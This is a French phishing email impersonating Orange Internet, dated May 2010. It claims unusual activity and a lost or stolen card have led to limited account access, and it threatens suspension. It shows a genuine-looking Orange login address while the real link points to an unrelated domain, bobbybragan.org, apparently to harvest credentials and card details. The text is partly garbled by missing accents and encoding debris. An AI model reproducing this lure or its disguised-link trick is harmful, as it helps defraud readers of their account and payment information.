 Cher client Orange Internet, Orange est determine maintenir un environnement sain pour notre communaute de clients. Pour proteger la securite de votre compte, Orange emploie certains des systemes de securite les plus avances au monde et notre equipe anti-fraude cran regulierement le systeme Orange pour toute activite inhabituelle. Nous sommes avec vous pour rappeler que le 16 Mai 2010 de notre equipe charge de l'examen du compte identifie certains activite inhabituelle sur votre compte.Conformement l'Accord d'utilisation de Orange et d'assurer que votre compte n'a pas t compromis, l'acces votre compte a t limite. Votre compte d'acces restera limite jusqu' ce que ce probleme a ete resolu. Pour securiser votre compte et de retablir rapidement un acces complet, nous pouvons exiger des informations supplementaires de votre part pour la raison suivante: Nous avons ete informes que d'une carte associe votre compte a ete signale comme perdu ou vole, ou qu'il ya eu d'autres problemes avec votre carte. Ce processus est notre obligatoire, et si cela n'est pas accomplie dans le temps le plus proche de votre compte ou de carte de credit peuvent faire l'objet d'une suspension temporaire. Pour securiser votre compte et de retablir rapidement un acces complet, nous pouvons exiger des informations supplementaires de votre part pour la raison suivante: http://id.orange.fr/auth_user/bin/auth_user.cgi?origine=wg > (http://bobbybragan.org/www.orange.fr/2/) пїЅ 2010 societe Orange Corporation. Tous droits reserves.* 